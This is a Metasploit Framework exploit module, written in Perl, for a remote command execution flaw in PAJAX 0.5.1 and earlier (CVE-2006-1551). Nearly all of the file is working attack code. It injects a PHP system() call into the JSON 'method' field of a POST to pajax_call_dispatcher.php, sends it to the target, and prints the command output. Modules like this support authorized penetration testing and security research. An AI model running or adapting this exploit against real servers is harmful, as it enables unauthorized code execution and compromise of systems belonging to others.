
##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Exploit::pajax_remote_exec;
use base "Msf::Exploit";
use strict;
use Pex::Text;
use bytes;

my $advanced = { };

my $info = {
	'Name'     => 'PAJAX Remote Command Execution',
	'Version'  => '$Revision: 1.1 $',
	'Authors'  => [ 'Matteo Cantoni <goony@nothink.org>' ],
	'Arch'     => [ ],
	'OS'       => [ ],
	'Priv'     => 0,
	'UserOpts' =>
	  {
		'RHOST'  => [1, 'ADDR', 'The target address'],
		'RPORT'  => [1, 'PORT', 'The target port', 80],
		'VHOST'  => [0, 'DATA', 'The virtual host name of the server'],
		'DIR'    => [1, 'DATA', 'PAJAX path', '/pajax/pajax/pajax_call_dispatcher.php'],
		'MODULE' => [1, 'DATA', 'PAJAX module', 'Calculator'],
		'SSL'    => [0, 'BOOL', 'Use SSL'],
	  },

	'Description' => Pex::Text::Freeform(
		qq{
			RedTeam has identified two security flaws in PAJAX (<= 0.5.1).
			It is possible to execute arbitrary PHP code from unchecked user input.
			Additionally, it is possible to include arbitrary files on the server
			ending in ".class.php".
}),

	'Refs' =>
	  [
		['OSVDB', '24618'],
		['BID', '17519'],
		['CVE', '2006-1551'],
		['URL', 'http://www.redteam-pentesting.de/advisories/rt-sa-2006-001.php'],
		['MIL', '1672'],
	  ],

	'Payload' =>
	  {
		'Space' => 400,
		'Keys'  => ['cmd'],
	  },

	'Keys' => ['pajax'],

	'DisclosureDate' => '2006-03-30',
  };

sub new {
	my $class = shift;
	my $self = $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);
	return($self);
}

sub Exploit {
	my $self = shift;
	my $target_host    = $self->VHost;
	my $target_port    = $self->GetVar('RPORT');
	my $dir            = $self->GetVar('DIR');
	my $module         = $self->GetVar('MODULE');
	my $encodedPayload = $self->GetVar('EncodedPayload');
	my $cmd            = $encodedPayload->RawPayload;

	$cmd = $self->URLEncode($cmd); chomp $cmd;

	my $ajaxdata = "{\"id\": \"bb2238f1186dad8d6370d2bab5f290f71\", \"className\": \"$module\", \"method\": \"add(1,1);system($cmd);\$obj->add\", \"params\": [\"1\", \"5\"]}";

	my $request =
	"POST $dir HTTP/1.1\r\n".
	"Accept: */*\r\n".
	"Host: $target_host:$target_port\r\n".
	"Content-Length:".length($ajaxdata)."\n\n".$ajaxdata;
	"Connection: Close\r\n".
	"\r\n";

	my $s = Msf::Socket::Tcp->new(
		'PeerAddr' => $target_host,
		'PeerPort' => $target_port,
		'SSL'      => $self->GetVar('SSL'),
	  );

	if ($s->IsError){
		$self->PrintLine('[*] Error creating socket: ' . $s->GetError);
		return;
	}

	$self->PrintLine("[*] Establishing a connection to the target...");

	$s->Send($request);

	my $results = $s->Recv(-1, 20);

	my @results = split(/\n/, $results);

	if (grep(/^HTTP\/1.1 200 OK/, @results)){

		for(0..12){shift @results;}
		for(0..2){pop @results;}

		$self->PrintLine('');

		foreach(@results){
			$self->PrintLine($_);
		}
	} else{
		$self->PrintLine("[*] This server does not appear to be vulnerable.");
	}

	$s->Close();
	return;
}

sub URLEncode {
	my $self = shift;
	my $data = shift;
	my $res;

	foreach my $c (unpack('C*', $data)) {
		if (
			($c >= 0x30 && $c <= 0x39) ||
			($c >= 0x41 && $c <= 0x5A) ||
			($c >= 0x61 && $c <= 0x7A)
		  ) {
			$res .= chr($c);
		} else {
			$res .= sprintf("%%%.2x", $c);
		}
	}
	return $res;
}

sub VHost {
	my $self = shift;
	my $name = $self->GetVar('VHOST') || $self->GetVar('RHOST');
	return $name;
}

1;
